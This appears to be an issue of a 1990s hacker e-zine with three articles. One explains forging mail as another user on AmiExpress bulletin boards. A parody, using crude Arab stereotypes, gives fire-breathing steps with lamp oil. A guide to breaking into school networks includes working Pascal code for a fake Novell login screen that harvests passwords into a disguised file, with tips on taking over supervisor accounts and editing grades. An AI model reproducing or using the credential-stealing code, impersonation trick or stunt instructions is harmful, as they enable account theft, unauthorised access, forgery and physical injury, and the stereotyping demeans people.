i have tested this on the versions 3.x and 4.x ... i haven't tried it on any 
lower versions but i guess it will still work.


----=(mETHOD)=--------------------------------------------------------------

Log onto a lame pir8 bbs, it is best to use one you couldn't give a shit if
you were deleted from it (i will tell you why later) and enter it under your
usual alias/password etc.

you must find out how the user you want to attack types his name, eg: i write
my name like bAD lANGUAGE not Bad Language. it is important to note exactly
how they write it otherwise users that are reading the fake mail will notice
something is strange if the way the name is typed/spelt is different to how
it normally is!  to find out how look through the user list or read some mail
that the lammah has previously written.

now once you are in the main menu go into 'write your options' this is the 
command 'W' from the prompt.  once you are in the write options menu select
'1' which is changing your current name/alias. (bauds with AquaSetting or
similar have a sub menu before you can edit your options such as name/
password/location etc)

say we are the user bAD lANGUAGE and we want to write fake mail under the user
LaMe WaNKeR.  what we would do is change our name to LaMe WaNKeR (make sure
everthing is typed correctly). AND before we hit return and find out that we
can't use that name as it is already being used we hit the space bar after the
last letter and then enter. 

eg: you would type in        "LaMe WaNKeR "     (don't type the quotes for the
                                         ^       dickheads that are around!)    
                                         |
             see the extra space  -------'

to the computer/software "LaMe WaNKeR" is totally different to "LaMe WaNKeR "
this must be a bug/badly coded section in the software aMIxPRESS which causes
this to happen! 

oh well i guess you can now write what ever message you want, but remember
to change your name back to normal after you have finished!


NOTE: some sysops who already know this or don't want users editing there
      name have disabled the change name/alias function SO you CAN'T change
      your name and write any fake mail at all!!! to bad! learn how to hack
      it instead!

----=( *** WARNING, WARNING, DANGER *** )=----------------------------------

although this seems to work very well it has its great disadvantage... all
actions you do are logged, including the fact that you changed your name to
LaMe WaNKeR so thats why you should only do this on a lame board as if the
sysop searches the callerslog to see who did it he/she would probably delete
you!

UNLESS!!! you want to hack da baud and remove the appropriate line from the 
callerslog file, but this seems to be a waste of time as if you can hack 
amixpress you might as well grab the user.data and have all users passwords
including the sysops! hehehe well that is another story...


----=(tHE eND)=-------------------------------------------------------------

well thats it from me in this issue of T.o.T, i hope you have enjoyed what
i have done and look out for more stuff coming your way!

p.S  F.i.T.H (fUCKED iN tHE hEAD, my bbs) will be opening soon!!!!!!! enjoy!

                            HOW TO BREATHE FiRE!

-------------------------------ANTiCONFORMiST-------------------------------

  ANTiCONFORMiST Brings you R. Sonist's Article on Breathing Fire:


  PARENTAL WARNING    DO NOT LET YOUR PARENTS SEE THIS


    HOO BOY Dis time ANTiC has really be go over top. He say
  R. Sonist i want you show readers how to do really dangerous
  stuff like um
                             BREATHE FIRE

    Hah I tell thrice cursed. Jihad starting rocket launching ANTiC
  May all his camels be so ugly they bring shame upon his
  family. The goddess infidel be think he has me fucked on this one.
  But unworthy of blessing ANTiC not be know I be interdesert
  fire spitting champ for three years on run.

    But before I show holy ToT readers sacred secrets of most
  spectacular party trick since losing at Arab roulette, her is
  government health warning at childrento be reading this.

    Little ones dont do this in your familys tent - go to your
  friends tent and do it there. This is dangerous stunt which can fry
  face, melt gold teeth and burn down tents.

    All that is needed is flammable potion to fill mouth, fire
  stick to ignite potion and large sex organs of dessert warrior.
  many many potions are flamable but only some are good to spit fire
  some on the other camel are very very bad.

    Petrol is worst, petrol can blow up in mouth like scud missile
  still in launcher, blasting lower jaw from head and making ears pop
  in chronic manner.

    So do not use petrol even unleaded.
  Kerosine is safer because it not explode like petrol; but it leave
  mouth  tasting worse than sex organs of village goat. It also make
  lovely black smoke around yellow flame and remove mosy scum from
  teeth.

    Metho is okay but flame isnt so good and if you drazy enough to
  breath fire you crazy enough to drink the stuff

    No mine friends best fire spit potion is lamp oil. Is very
  poisoness so must not be swallowed ever. But lamp oil not leave to
  bad taste in mouth, taste no worse than smearing vasaline inside
  mouth cavity. No city dwelling infidel use lamp oil so very hard to
  get in cities. Except at MITRE 10.
        STEP 1.   Take sip of holy lamp oil
        STEP 2.   Hold fire source exactly one cubit from gob (the
                  length of your forearm you faithless unbelievers)
        STEP 3.   Do not inhale
        STEP 4.   Spit holy oil at flame source. Do not be spraying oil
                  but make spurtings like when crazy camel spit chewing
                  tobacco
        STEP 5.   Give many sincere thanks to Allah for huge harem of
                  women who will flock to your tent for ravishment
                  seconds after you display your bravado with your new
                  party trick

                                  R. Sonist

                          HOW TO HACK A SCHOOL NET

-------------------------------ANTiCONFORMiST-------------------------------

The following method of hacking a schools network which I thought of while
trying to hack the Waitakere College Net, will work on any platform and just
about any system.  This is both an effictive and efficient method, SO USE IT!
Hack networks, create anarchy for the teachers/network admin staff.  Just
make sure you don't take all the credit for the idea.

Ingredients
-----------

1. Basic knoledge of a compiling computer language
   e.g. pascal, c, c++ etc

2. A Directory on a Server where you have read and write rights

3. A copy of the logon screen (if one is used)

Method
------

To start with you need to write a small program that will emulate the logon
process. i.e. display the logon screen, enter name + password etc..

The program must be able to save the data it collects to the dir you have
rights to.  It is a good idea to make the program as accurate as you can so
the teachers etc don't notice any differences at first.  Of cause unless you
are an expert programmer you will not be able to write a successful tsr to
capture the keys when the right prompt appares, so you will need to your
program so it prints an error after the details are entered.  The reason for
this is is the teacher/supervisor will (after entering their logon and
password a few times) come to the conclusion that for some reason the
machine is not accessing the network.  Thus rebooting it, not knowing what
you have been upto.  Therefore thinking nothing of it after machine boots.

Now you can logon to another terminal, get the data file and away you go.
Its that simple.

Hints & Tips
------------

1. Plan your attack and study the logon process, see what it does if you
   enter an invalid password etc.

2. Make the name of the file your saving the name and password to
   inconspicuous so that if the supervisor finds it he/she wont remove it.

3. Don't tell anybody what you are doing until after you have done it. Even
   if you trust them, they might have a concience, and nark or sumfin.

4. Once you have the supervisor password account, login as him/her after
   checking that he/she is not already logged in, set your account to have
   access to all directories and all facilities that the network offers.

5. Do what the hell you like, sponge files, edit your grades, send e-mail.

Network Hack Algorithm
----------------------

Display Login Screen (if there is one)
Write Name Prompt
Get name
if the name not entered write the usage
Write Password Prompt
Get password
Write error


Sample Pascal Code
------------------

{Does not display logo Just gets data and displays usage}
{Used with Novell networks}
{No error coded in, User will just not get logged in}

Program False_Nlogin;

Uses Dos,crt;

Var
   NameStr,        {Stores login name}
   PasswordStr,    {Stors password}
   Try : String;
   x,k,y:byte;     {Used for counters}
   Ch : Char;
   f:text;         {Var for file}

function FileExists(FileNam: String): Boolean;
{ Boolean function that returns True if the file exists;otherwise,
 it returns False. Closes the file if it exists. }
var
 F: file;
begin
 {$I-}
 Assign(F, FileNam);
 FileMode := 0;  { Set file access to read only }
 Reset(F);
 Close(F);
 {$I+}
 FileExists := (IOResult = 0) and (FileNam <> '');
end;  { FileExists }

Procedure Usage;
{Shows The Usage Of Nlogin}

Begin
     WriteLn('Usage Login [/Options] [/Server] [Username] [ScriptParameters]'
     );
     WriteLn('Options :  Clear screen');
     WriteLn('           No attach');
     WriteLn('           Script <path spec>');
     WriteLn;
End;

procedure getdata;
{Enters all the data Needed i.e.login
name, password}

begin  {GetData}
y:=0;
for x := 1 to 2 do begin
case x of
     1:Write('Enter your login name: ');
     2:write('Enter your password: ');
end;
inc(y);
repeat
ch := readkey;
case ch of
     #8 : Begin
     if k > 1 then begin
        dec(k);
        Delete(try,k,1);
        write(ch);
        clreol;
        end;
        end;
     #13,#10,#27 : Begin
     writeln('');
     end;
     else
         begin
              try:=try+ch;
              case x of
              1:write(ch);
              end;
              inc(k);
         end;
     end;
until (ch = #13) or (ch = #10) or (ch = #27);
case y of
     1:begin namestr:=try; try:=''; end;
     2:begin passwordstr:=try; try:=''; end;
end;
end;
if namestr = '' then begin usage; halt(0); end;
end;   {GetData}

procedure writedata;
{writes the data to a file, checks to see if the files
exists first}

begin {WriteData}
assign(f,'go039.bat');
if fileexists('go039.bat') = false then
   rewrite(f)
   else
   append(f);
writeln(f,'Name: ',namestr);
writeln(f,'Password: ',passwordstr);
writeln(f);
close(f);
end;  {WriteData}

begin {Main Code}
getdata;     {runs the getdata procedure}
writedata;   {runs the writedata procedure}
end.  {Main Code}

  HyPe is one of my FIRST handles i started with, when i began
  ToT i had to stay with that name.. But that wasnt gonna stop
  me from using other handles.. So i started the name RaiDeR,
  Which i used for a yr or so.. Then one day after a bit of
  hacking under my RdR handle i changed to 7Rz.. And i use the
  handle even now.. I am still on some boardz o/s with the 
  HyPe alias.. but nowadayz you will see me on Boardz (h/p)
  under 7Rz..HyPe..qWid ..Ok qWid was started when i first got
  on iRC.. and since then (6months) i am still using that
  alias name.. so you can catch me on #HaCk #PhReak #Cellular
  #BlueBox #aMIGA! sometimz #ToT..
  Ok, thats basically it.. Umm so remembr not to get confused
  when you're chattin to 7Rz or qWid on the net/bbS'es =8)
